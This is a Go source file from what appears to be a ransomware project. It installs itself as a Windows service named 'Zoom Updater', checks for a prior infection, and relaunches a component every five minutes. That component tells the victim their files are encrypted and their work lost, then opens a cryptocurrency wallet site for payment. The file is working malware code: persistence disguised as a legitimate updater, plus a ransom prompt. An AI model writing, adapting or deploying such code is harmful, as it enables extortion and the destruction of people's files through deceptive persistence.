// +build windows,tor

package main

import (
    "os"
    "time"
    "runtime"

    "github.com/kernullist/gowinsvc"
    "github.com/sug0/sr-ransomware/go/exe"
    "github.com/sug0/sr-ransomware/go/win"
    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
)

type service struct {
    tor  *exe.Tor
    exec string
    date time.Time
}

const cryptoArg = "winmain"

func main() {
    if len(os.Args) > 1 && os.Args[1] == cryptoArg {
        cryptoMain()
        return
    }
    serviceMain()
}

func cryptoMain() {
    win.MessageBox(
        "Ooopsies!!!!!!!",
        "Looks like your files have been encrypted!",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.MessageBox(
        "Alright, so what?",
        "All your important work has been lost.",
        win.MB_OK | win.MB_ICONWARNING,
    )
    win.ShellExecute("open", "https://www.myetherwallet.com/", win.SW_SHOW)
}

func serviceMain() {
    runtime.LockOSThread()
    manager := gowinsvc.NewService("Zoom Updater")
    s := service{
        exec: os.Args[0] + (" " + cryptoArg),
    }
    manager.StartServe(&s)
}

func (s *service) Serve(exit <-chan bool) {
    var err error
    s.date, err = victim.InfectionDate()
    if err != nil {
        // for some reason victim hasn't been infected,
        // or the infection files have been tampered with;
        // all in all, it's just best to exit
        return
    }


    s.launchCrypto()
    for {
        select {
        case <-exit:
            return
        case <-time.After(5 * time.Minute):
            s.launchCrypto()
        }
    }
}

func (s *service) launchCrypto() {
    win.LaunchProcess(s.exec)
}
